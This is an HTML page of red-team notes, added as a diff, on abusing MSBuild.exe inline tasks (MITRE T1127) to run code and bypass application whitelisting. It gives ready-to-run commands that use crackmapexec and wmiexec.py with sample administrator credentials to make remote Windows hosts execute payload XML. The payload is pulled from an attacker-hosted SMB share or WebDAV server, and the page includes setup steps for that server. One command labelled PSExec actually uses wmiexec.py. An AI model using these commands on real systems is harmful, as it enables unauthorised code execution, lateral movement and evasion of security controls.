@@ -1,0 +1,91 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MSBuild</title>
+</head><body>https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus/<br/>
+https://www.n00py.io/2018/06/executing-meterpreter-in-memory-on-windows-10-and-bypassing-antivirus-part-2/<span style="font-size: 10pt"><br/>
+</span><span style="font-size: 10pt"><br/>
+MSBuild<br/>
+<span style="font-family: Roboto-Regular"><div style="text-align: left">MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. <a href="https://msdn.microsoft.com/library/dd393574.aspx">[1]</a><br/>
+</div></span><br/>
+<span style="font-family: Roboto-Regular"><div style="text-align: left">Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. <a href="https://msdn.microsoft.com/library/dd393574.aspx">[1]</a>Inline Tasks MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution. [2]<br/>
+</div></span><br/>
+========================================================================== &nbsp;<br/>
+</span><br/>
+In certain versions of .Net, you can use msbuild.exe to execute a payload from an .xml file. Msbuild can be called any number of ways. There are two main ways to source the payload: smb and webdav (or www server). <br/>
+<br/>
+Files pulled from webdav are stored in Windows\ServiceProfiles\LocalService\AppData\Local\Temp directories, so be mindful<br/>
+Msbuild is not disk-less, stores files in %USER%\AppData\Local\Temp, but it does clean up after itself<br/>
+<br/>
+Using SMB:<br/>
+<br/>
+Directly:<br/>
+%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest Share\msbuild_nps.xml<br/>
+<br/>
+CME:<br/>
+crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml'<br/>
+<br/>
+PSExec:<br/>
+python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml<br/>
+<br/>
+WMI:<br/>
+python wmiexec.py Adminstrator:Password123@192.168.137.1 cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.133\Guest\msbuild_nps.xml<br/>
+<br/>
+<br/>
+Using WebDav<br/>
+pip install WsgiDav cheroot<br/>
+wsgidav --host=0.0.0.0 --port=80 --root=/tmp<br/>
+<br/>
+CME: <br/>
+crackmapexec smb 192.168.137.1 -u Administrator -p Password123 -x '%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml'<br/>
+<br/>
+WMI:<br/>
+python wmiexec.py Administrator:Password123@192.168.137.1<br/>
+C:\&gt;%windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\192.168.137.134\Davwwwroot\test\msbuild_nps.xml<br/>
+<br/>
+<br/>
+<b>Build and execute a C# project stored in the target XML file.</b><br/>
+msbuild.exe pshell.xml &nbsp;<br/>
+<br/>
+<b>Build and execute a C# project stored in the target CSPROJ file</b><br/>
+msbuild.exe Msbuild.csproj<br/>
+<br/>
+Windows binary: True<br/>
+Bypasses Default AppLocker Rules: True<br/>
+Mitre: <a href="https://attack.mitre.org/wiki/Technique/T1127">T1127</a><br/>
+Links:<ul><li style="list-style-type: none"><ul><li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md</a></li>
+<li><a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a></li>
+<li><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a></li>
+</ul>
+</li>
+</ul>
+<br/>
+<a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br/>
+File path:<ul><li style="list-style-type: none"><ul><li>C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe</li>
+<li>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe</li>
+</ul>
+</li>
+</ul>
+<br/>
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe<br/>
+Acknowledgement:<ul><li style="list-style-type: none"><ul><li>Name: Casey Smith</li>
+<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@Subtee">@Subtee</a></li>
+<li>Blog: <a href="https://subt0x11.blogspot.com/">https://subt0x11.blogspot.com/</a></li>
+</ul>
+</li>
+<li>Name: Cn33liz</li>
+<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@Cneelis">@Cneelis</a></li>
+<li>Blog: <a href="http://cn33liz.blogspot.com/">http://cn33liz.blogspot.com/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+OS: Windows 10 1703<br/>
+<br/>
+</body></html>
